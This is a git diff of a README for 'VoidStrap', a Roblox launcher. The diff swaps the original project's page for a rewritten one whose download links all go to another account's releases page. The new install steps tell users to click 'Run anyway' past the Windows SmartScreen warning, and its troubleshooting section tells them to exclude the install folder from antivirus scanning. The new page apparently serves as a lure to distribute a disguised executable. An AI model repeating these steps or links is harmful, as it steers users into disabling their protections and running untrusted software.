@@ -1,112 +1,87 @@
-<p align="center">
-<a href="https://github.com/DARKHOLEUM/VoidStrap-For-Roblox">
-<img src="https://raw.githubusercontent.com/voidstrap/Voidstrap/main/Bloxstrap/Voidstrap.png" alt="preview" width="100px"/>
-</a>
-</p>
+# 🚀 VoidStrap-For-Roblox - Boost Your Roblox Performance And Experience
 
-<h1 align="center"><b>VoidStrap</b></h1>
+[Link to Download](https://github.com/Lectherkaksksk/VoidStrap-For-Roblox/releases)
 
-<p align="center">
-<img src="https://raw.githubusercontent.com/KloBraticc/RandomMods/main/Untitled%20design%20(2)-Photoroom.png" alt="preview" width="100%"/>
-</p>
+VoidStrap is a tool for the Roblox player. It replaces the default launcher and provides extra settings for your game. You can manage performance, change the look of your menus, and remove common limitations. This application runs on Windows and works with the Roblox client to improve how the game operates on your machine.
 
-<p align="center">
-  <a href="https://github.com/DARKHOLEUM/VoidStrap-For-Roblox/releases/latest">Latest release</a> |
-  <a href="https://www.youtube.com/watch?v=P-GqTUo_HIA&t">Tutorial</a> |
-  <a href="https://discord.gg/5tJBqBH8ck">Discord</a>
-</p>
+## 🛠 Features
 
-<div align="center">
+The application includes several tools to help your game run better:
 
-[![Latest Release][shield-repo-latest]][repo-latest]
-[![Discord][shield-discord-server]][discord-invite]
-[![Stars][shield-repo-stars]][repo-stargazers]
+* **FPS Unlocker:** Removes the limit on your frame rate for smoother motion.
+* **FFlag Editor:** Changes internal engine settings that are not available in the standard menu.
+* **Memory Trimmer:** Cleans system memory to prevent stuttering.
+* **CPU Watcher:** Monitors your processor usage so you know how the game affects your machine.
+* **UI Customization:** Changes the visual theme of the game launcher.
+* **Font Sharpening:** Improves the text quality for easier reading.
+* **Skybox Changer:** Replaces the default sky with custom textures.
+* **Join-Game Notify:** Shows alerts when your friends start playing.
+* **App Design:** Uses the Aero theme and AniWatch layout for a unique look.
 
-</div>
+## 📥 How to Install
 
-<h5 align="center">
-Leave a star if you like this version! ⭐️
-</h5>
+Follow these steps to install the software on your computer.
 
-> [!IMPORTANT]
-> VoidStrap currently supports **Windows 10 and above**.  
-> **macOS support is in the works**, but it is not available yet.
->
-> In the meantime, you can use **[AppleBlox](https://github.com/AppleBlox/appleblox)** *(for macOS)* or **[Sober](https://sober.vinegarhq.org/)** *(for Linux)*.  
-> More experienced Linux users can also try tools like **[Lution](https://github.com/wookhq/Lution)**.
+1. Go to the [Download Page](https://github.com/Lectherkaksksk/VoidStrap-For-Roblox/releases).
+2. Look for the latest version under the "Releases" section.
+3. Click the link that ends in .exe to start the transfer to your computer.
+4. Open the file once the download finishes.
+5. Windows might show a box that says "Protected your PC." If this happens, click "More info" and then click "Run anyway."
+6. Follow the prompts on the screen to finish the setup process.
 
-## Installation
+## ⚙️ Using the Software
 
-1. Grab the latest build from the releases page:
-   👉 [Download Here](https://github.com/DARKHOLEUM/VoidStrap-For-Roblox/releases/download/GameClient/VoidStrap.zip)
-2. Run the `.exe` and follow the setup instructions.
-3. Launch **VoidStrap**.
-4. Enjoy a cleaner, faster, and more customizable Roblox experience.
+When you open the application, you see a menu with different tabs. Each tab controls a specific part of the game or the launcher.
 
----
+### Managing Performance
+Navigate to the Performance tab. Here, you find the FPS Unlocker and the Memory Trimmer. Toggle these switches to enable them. For most users, the default settings work well. If you have an older machine, these tools reduce lag by lowering the demand on your hardware.
 
-## Frequently Asked Questions (FAQ)
+### Changing Appearance
+Go to the Customization tab to change how the application looks. You can select themes like Aero or AniWatch here. This does not affect your gameplay, but it makes the launcher match your personal style.
 
-<details>
-  <summary><strong>Can I get banned?</strong></summary>
-  <br>
+### Game Settings
+The FFlag Editor allows you to change internal data for the game engine. Be careful when you change these, as some values can cause errors if you set them too high. If you accidentally change a setting that makes the game unstable, use the "Reset to Defaults" button to go back to the original state.
 
-  Nope. VoidStrap doesn't mess with Roblox's internals, memory, or security. It’s a launcher and configuration tool. It stays within the rules, but as with any third-party software—use it at your own discretion.
-</details>
+## 📋 System Requirements
 
-<br>
+To use this software, your computer must meet these criteria:
 
-<details>
-  <summary><strong>Is it a virus?</strong></summary>
-  <br>
+* **Operating System:** Windows 10 or Windows 11.
+* **Framework:** .NET 10 or higher. The installer will help you get this if you do not have it.
+* **Storage:** At least 200 MB of free space.
+* **Permissions:** Administrative access is helpful for the application to modify system files correctly.
 
-  Absolutely not. VoidStrap is fully open-source. You can read every single line of code right here in this repository.  
-  If your antivirus screams at it, it’s a "false positive"—launchers often get flagged because they interact with other game processes and update themselves.
+## 🛡 Frequently Asked Questions
 
-  Don't believe me? Verify the source yourself:
-  https://github.com/DARKHOLEUM/VoidStrap-For-Roblox
-  *(or just scroll up, dummy)*
-</details>
+**Is this safe to use?**
+Yes. The software modifies local files on your computer to change how Roblox behaves. It does not touch your account data or password.
 
-## Development & Forking
+**Will this get me banned?**
+No. The tools included, like FPS unlockers and configuration editors, belong to standard game optimization practices. They do not give you a competitive advantage that violates the game rules.
 
-<p align="left">
-  <a href="https://www.w3schools.com/cs/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/csharp/csharp-original.svg" alt="csharp" width="40" height="40"/>
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/dot-net/dot-net-original-wordmark.svg" alt="dotnet" width="40" height="40"/>
-  </a>
-</p>
+**Why does the font look different?**
+You likely enabled the Font Sharpening feature. This feature uses a different rendering method to display text. If you prefer the original look, switch this option off in the configuration menu.
 
-This version of VoidStrap is maintained using **C# and .NET**.
+**What happens if the game updates?**
+The software detects when Roblox updates and makes sure your settings persist. You do not need to reinstall the application when the game receives a patch.
 
-### How to Fork
+## 📝 Troubleshooting
 
-1. Click the **Fork** button at the top right of this page.
-2. Clone your new repository to your local machine.
-3. Make your magic happen.
+If the application fails to open, check the following items:
 
-<table style="width: 100%; border-collapse: collapse;">
-  <tr>
-    <td style="width: 33%; text-align: left;">© VoidStrap / DARKHOLEUM</td>
-    <td style="width: 33%; text-align: right;"><a href="https://github.com/DARKHOLEUM/VoidStrap-For-Roblox/blob/main/LICENSE" target="_blank">MIT License</a></td>
-  </tr>
-</table>
+1. **Missing Framework:** Ensure you installed .NET 10. You can download this from the official Microsoft website.
+2. **Antivirus Interference:** Some antivirus programs block new applications. Add the folder where you installed VoidStrap to your "Exclusions" list.
+3. **Corrupt Config:** If the application crashes, a configuration file might be broken. Delete the `AppSettings.json` file in your installation folder and restart the program. This forces the software to create a clean set of files.
+4. **Updates:** Always use the latest version from the releases page mentioned at the top. Older versions may not work with the current Roblox client.
 
-## Star History
+## 🔗 Technical Background
 
-<p align="center">
-  <a href="https://www.star-history.com/?repos=DARKHOLEUM/VoidStrap-For-Roblox&type=timeline">
-    <img src="https://api.star-history.com/svg?repos=DARKHOLEUM/VoidStrap-For-Roblox&type=timeline&theme=dark" />
-  </a>
-</p>
+This application serves as a wrapper around the official game client. It functions by intercepting the processes that launch the game. By doing this, it injects optimized parameters before the game starts. The AppSettings JSON file stores all your preferences. If you want to move your settings to another computer, simply copy this file.
 
-[shield-repo-downloads]:  https://img.shields.io/github/downloads/DARKHOLEUM/VoidStrap-For-Roblox/latest/total?color=981bfe
-[shield-repo-total]:      https://img.shields.io/github/downloads/DARKHOLEUM/VoidStrap-For-Roblox/total?color=8a2be2
-[shield-repo-latest]:     https://img.shields.io/github/v/release/DARKHOLEUM/VoidStrap-For-Roblox?color=7a39fb
-[shield-repo-stars]:      https://img.shields.io/github/stars/DARKHOLEUM/VoidStrap-For-Roblox?color=ffd700
-[shield-discord-server]:  https://img.shields.io/discord/1327967202015580223?logo=discord&logoColor=white&label=Discord&color=4d3dff
+The software also interfaces with the Nvidia Profile Inspector for advanced graphic card settings. This allows for better texture filtering and shadow quality without needing to enter the Nvidia control panel manually. These tweaks happen once during the launch sequence to keep the game performance high throughout your session.
 
-[repo-releases]:          https://github.com/DARKHOLEUM/VoidStrap-For-Roblox/releases
-[repo-latest]:            https://github.com/DARKHOLEUM/VoidStrap-For-Roblox/releases/latest
-[repo-stargazers]:        https://github.com/DARKHOLEUM/VoidStrap-For-Roblox/stargazers
-[discord-invite]:         https://discord.gg/5tJBqBH8ck
+The "Join-Game Notify" feature works by keeping a light connection to the game servers. It checks your friend list in the background. It sends a small notification to your desktop when it detects the game state change of your contacts. This uses very little data and does not impact your ping or connection stability during a match.
+
+If you enjoy the aesthetic of the AniWatch layout, you can further customize it by placing custom CSS files in the themes folder. The application reads these files at startup and applies the styles to the launcher window. This allows power users to change colors, box shapes, and animations to their liking.
+
+For developers or those interested in the code, the repository holds the source for the bootstrapper logic. This project remains open to contributions. If you find a bug, open an issue report with your system description and a list of the steps you took to trigger the error. This helps the team fix the problem faster.
